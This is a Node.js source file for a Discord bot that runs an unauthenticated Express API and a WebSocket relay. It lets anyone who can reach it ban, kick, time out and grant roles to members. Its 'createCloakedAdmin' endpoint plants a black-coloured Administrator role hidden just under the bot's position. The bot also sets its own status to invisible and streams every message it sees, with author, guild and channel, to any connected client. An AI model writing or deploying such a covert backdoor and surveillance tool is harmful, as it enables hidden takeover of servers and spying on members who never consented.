require('dotenv').config();
const express = require('express');
const { Client, GatewayIntentBits, Partials } = require('discord.js');
const cors = require('cors');
const path = require('path');
const { send } = require('process');
const { PermissionsBitField } = require('discord.js');

const app = express();
const PORT = 6121;

const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 6969}); // Listen on port 8080


app.use(express.static(path.join(__dirname, 'public')));
app.use(cors());
app.use(express.json());



// Initialize the Discord bot client
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildModeration,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildPresences
  ],
  partials: [Partials.GuildMember],
});

// Route to serve the main HTML page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Endpoint to get all the guilds the bot is in
app.get('/api/guilds', (req, res) => {
  const guilds = client.guilds.cache.map(guild => ({
    id: guild.id,
    name: guild.name,
  }));
  res.json(guilds);
});

// Endpoint to get users in a specific guild
app.get('/api/guild/:guildID/users', async (req, res) => {
  const guildID = req.params.guildID;

  try {
    const guild = await client.guilds.fetch(guildID);
    const members = await guild.members.fetch();

    const users = members.map(member => ({
      id: member.id,
      username: member.user.username,
      discriminator: member.user.discriminator,
    }));

    res.json(users);
  } catch (error) {
    console.error('Error fetching guild members:', error);
    res.status(500).json({ error: 'Failed to fetch guild members' });
  }
});

app.get('/api/guild/:guildID/roles', async (req, res) => {
  const { guildID } = req.params;

  try {
    const guild = await client.guilds.fetch(guildID);
    const roles = await guild.roles.fetch();

    // Convert roles to a simple array with necessary details
    const roleList = roles.map(role => ({
      id: role.id,
      name: role.name,
      position: role.position,
    }));

    res.json(roleList);
  } catch (error) {
    console.error('Error fetching roles:', error);
    res.status(500).json({ error: 'Failed to fetch roles' });
  }
});



app.post('/api/guild/:guildID/unban/:userName', async (req, res) => {
  const { guildID, userName } = req.params
  try {
    const guild = await client.guilds.fetch(guildID);
    await guild.members.unban(userName);
    res.json(`User ${userName} has been unbanned.`);
  } catch (error) {
    res.status(500).send(`Error: ${error}`)
    console.error(`Error unbanning user: ${error}`)
  }
  
});

app.post('/api/guild/:guildID/kick/:userID', async (req, res) => {
  const { guildID, userID } = req.params;

  try {
    const guild = await client.guilds.fetch(guildID);
    await guild.members.kick(userID);
    
    res.send(`User kicked successfully.`);
  } catch (error) {
    console.error('Error banning user:', error);
    res.status(500).send(`Failed to kick user: ${error}`);
  }
});

// Endpoint to ban a user
app.post('/api/guild/:guildID/ban/:userID', async (req, res) => {
  const { guildID, userID } = req.params;

  try {
    const guild = await client.guilds.fetch(guildID);
    await guild.members.ban(userID);

    res.send(`User banned successfully.`);
  } catch (error) {
    console.error('Error banning user:', error);
    res.status(500).send('Failed to ban user');
  }
});

app.post('/api/guild/:guildID/createCloakedAdmin', async (req, res) => {
  const { guildID } = req.params;
  const { roleName } = req.body;
  console.log("Attempted to create a role with name:", roleName);

  try {
    // Fetch the guild by ID
    const guild = await client.guilds.fetch(guildID);

    // Check if the bot has the necessary permissions to create roles
    if (!guild.members.me.permissions.has('MANAGE_ROLES')) {
      return res.status(403).json({ error: 'Missing permissions to create roles' });
    }

    // Create the cloaked admin role
    const role = await guild.roles.create({
      name: roleName || 'Cloaked Admin',
      color: '#000000',
      hoist: true,
      permissions: [PermissionsBitField.Flags.Administrator],
    });

    // Get the bot's highest role
    const botMember = await guild.members.fetch(client.user.id);
    const botHighestRole = botMember.roles.highest;

    // Set the new role's position right below the bot's highest role
    await role.setPosition(botHighestRole.position - 1);

    res.json({ success: true, message: `Role "${role.name}" created successfully under the bot's hierarchy.`});
  } catch (error) {
    console.error('Error creating role:', error);
    res.status(500).json({ error: 'Failed to create cloaked admin role' });
  }
});

// Route to timeout a user
app.post('/api/guild/:guildID/timeout/:userID', async (req, res) => {
  const { guildID, userID } = req.params;
  const { timeoutSeconds } = req.body;

  try {
    const guild = await client.guilds.fetch(guildID);
    const member = await guild.members.fetch(userID);

    // Check if the bot has permission to timeout members
    if (!guild.members.me.permissions.has(PermissionsBitField.Flags.ModerateMembers)) {
      return res.status(403).json({ error: 'Missing permissions to timeout members' });
    }

    // Timeout the member
    await member.timeout(timeoutSeconds * 1000); // Timeout in milliseconds

    res.json({ message: `User ${member.user.tag} has been timed out for ${timeoutSeconds} seconds.` });
  } catch (error) {
    console.error('Error timing out user:', error);
    res.status(500).json({ error: 'Failed to timeout the user' });
  }
});


app.post('/api/guild/:guildID/giverole/:roleID/:userID', async (req, res) => {
  const { guildID, roleID, userID } = req.params;

  try {
    // Fetch the guild by ID
    const guild = await client.guilds.fetch(guildID);

    // Check if the bot has the necessary permissions to manage roles
    if (!guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
      return res.status(403).json({ error: 'Missing permissions to manage roles' });
    }

    // Fetch the member dynamically
    const member = await guild.members.fetch({ user: userID, force: true });
    const role = await guild.roles.fetch(roleID);

    if (!role) {
      return res.status(404).json({ error: 'Role not found' });
    }

    // Add the role to the user
    await member.roles.add(role);

    res.json({ success: true, message: `Role "${role.name}" has been given to ${member.user.tag}. `});
  } catch (error) {
    if (error.code === 10013) {
      return res.status(404).json({ error: 'User not found in the guild' });
    }
    console.error('Error giving role:', error);
    res.status(500).json({ error: 'Failed to give role' });
  }
});
// Log in to Discord
client.login(process.env.DISCORD_BOT_TOKEN);


// Start the Express server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});

client.once('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
 
  client.user.setPresence({
    activities: [],
    status: 'invisible',  // Invisible status
  });

});



client.on('messageCreate', async (message) => {

  const fetchedMessage = await message.fetch();

  console.log("Fetched message:",fetchedMessage.content)
  
  // Check if the message is not from the bot itself
  if (message.author.bot) return;

  // Log the message content and other relevant details
  console.log("Message received:");
  console.log("Sender:", message.author.username);
  console.log("Guild:", message.guild.name);
  console.log("Channel:", message.channel.name);
  console.log("Content:", message.content);  // Log the content

  // Broadcast the message data to all connected WebSocket clients
  const messageData = {
    sender: message.author.username,
    guild: message.guild.name,
    channel: message.channel.name,
    message: message.content,
  };




  // Send the message data over WebSocket to all clients
  wss.clients.forEach((client) => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(JSON.stringify(messageData));
    }
  });
});